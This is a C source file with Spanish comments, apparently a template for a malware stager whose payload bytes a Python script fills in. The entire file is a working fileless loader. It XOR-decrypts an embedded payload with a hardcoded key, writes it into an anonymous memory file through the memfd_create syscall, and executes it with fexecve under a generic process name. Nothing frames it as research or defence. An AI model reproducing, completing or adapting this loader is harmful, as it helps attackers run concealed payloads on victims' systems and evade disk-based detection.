#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>

// La llamada al sistema memfd_create puede no estar en todas las cabeceras glibc
#if defined(__x86_64__)
#define __NR_memfd_create 319
#elif defined(__i386__)
#define __NR_memfd_create 356
#elif defined(__arm__)
#define __NR_memfd_create 385
#endif

// --- PLACEHOLDERS (serán reemplazados por el script de Python) ---
unsigned char payload[] = {
    PAYLOAD_PLACEHOLDER
};
const unsigned int payload_len = PAYLOAD_LEN_PLACEHOLDER;
const char key[] = "YourSecretKeyHere";
// -----------------------------------------------------------------

void xor_decrypt(unsigned char *data, size_t data_len, const char *key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

// CAMBIO 1: La firma de main ahora acepta argumentos
int main(int argc, char *argv[]) {
    xor_decrypt(payload, payload_len, key);

    // El nombre del ejecutable en memoria. Puede ser cualquier cosa.
    const char *mem_proc_name = "payload_process";
    int fd = syscall(__NR_memfd_create, mem_proc_name, 0);
    if (fd == -1) {
        perror("memfd_create falló");
        return 1;
    }

    if (write(fd, payload, payload_len) != payload_len) {
        perror("Escritura en memfd falló");
        close(fd);
        return 1;
    }

    // CAMBIO 2: Reenviar los argumentos al payload
    // A menudo es una buena práctica reemplazar argv[0] (que es el nombre del stager)
    // con el nombre que el payload espera o un nombre genérico.
    argv[0] = (char *)mem_proc_name;

    char *const envp[] = { NULL };
    fexecve(fd, argv, envp);

    perror("fexecve falló");
    close(fd);
    return 1;
}
